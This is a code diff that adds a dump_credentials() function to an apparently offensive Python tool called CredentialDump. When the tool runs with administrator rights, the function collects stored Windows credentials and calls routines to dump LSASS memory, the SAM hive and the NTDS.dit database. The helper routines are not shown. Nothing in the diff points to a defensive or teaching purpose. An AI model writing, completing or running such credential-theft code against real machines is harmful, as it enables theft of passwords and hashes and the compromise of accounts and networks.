@@ -175,4 +175,40 @@ class CredentialDump:
             
         except Exception as e:
             logging.error(f"Error saving credentials: {str(e)}")
-            return False 
+            return False
+
+def dump_credentials():
+    """
+    Main function to dump credentials from various sources
+    Returns a dictionary containing all gathered credentials
+    """
+    try:
+        dumper = CredentialDump()
+        results = {
+            "status": "success",
+            "windows_credentials": [],
+            "lsass_dump": False,
+            "sam_dump": False,
+            "ntds_dump": False,
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        # Get Windows stored credentials
+        win_creds = dumper.get_windows_credentials()
+        if win_creds:
+            results["windows_credentials"] = win_creds
+            
+        # Try LSASS dump if running as admin
+        if dumper.check_admin():
+            results["lsass_dump"] = dumper.dump_lsass()
+            results["sam_dump"] = dumper.get_sam_dump()
+            results["ntds_dump"] = dumper.get_ntds_dump()
+            
+        return results
+        
+    except Exception as e:
+        return {
+            "status": "error",
+            "error": str(e),
+            "timestamp": datetime.now().isoformat()
+        } 
